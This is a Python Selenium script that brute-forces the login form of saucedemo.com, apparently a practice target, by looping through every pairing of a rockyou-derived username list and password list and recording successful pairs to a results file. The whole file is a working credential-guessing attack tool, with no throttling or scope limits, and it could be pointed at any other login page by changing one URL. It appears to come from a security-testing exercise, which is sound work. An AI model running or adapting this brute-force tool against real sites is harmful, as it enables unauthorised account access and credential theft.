from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import os

LOGIN_URL = "https://www.saucedemo.com/"

driver = webdriver.Firefox()

userlist_path = os.path.expanduser("~/Official-SauceDemo/Security/Compiled/Wordlists/rockyou-usernames.txt")
wordlist_path = os.path.expanduser("~/Official-SauceDemo/Security/Compiled/Wordlists/rockyou-passwords.txt")
success_log = os.path.expanduser("~/Official-SauceDemo/Security/Compiled/Results/BruteForceLogin.txt")

try:
    with open(userlist_path, "r", encoding="latin-1") as file:
        usernames = file.read().splitlines()
except FileNotFoundError:
    print(f"[ERROR] Username list not found at {userlist_path}")
    driver.quit()
    exit()

try:
    with open(wordlist_path, "r", encoding="latin-1") as file:
        passwords = file.read().splitlines()
except FileNotFoundError:
    print(f"[ERROR] Password list not found at {wordlist_path}")
    driver.quit()
    exit()

success_file = open(success_log, "a")

for username in usernames:
    for password in passwords:
        try:
            driver.get(LOGIN_URL)

            username_input = driver.find_element(By.ID, "user-name")
            password_input = driver.find_element(By.ID, "password")
            login_button = driver.find_element(By.ID, "login-button")

            username_input.clear()
            password_input.clear()
            username_input.send_keys(username)
            password_input.send_keys(password)
            login_button.click()

            time.sleep(0.1)  

            if "inventory.html" in driver.current_url:
                success_msg = f"[SUCCESS] Username: {username} | Password: {password}"
                print(success_msg)

                success_file.write(success_msg + "\n")

                driver.get("https://www.saucedemo.com/")  
            else:
                print(f"[FAILED] Username: {username} | Password: {password}")

        except Exception as e:
            print(f"[ERROR] {e}")
            continue

success_file.close()

driver.quit()
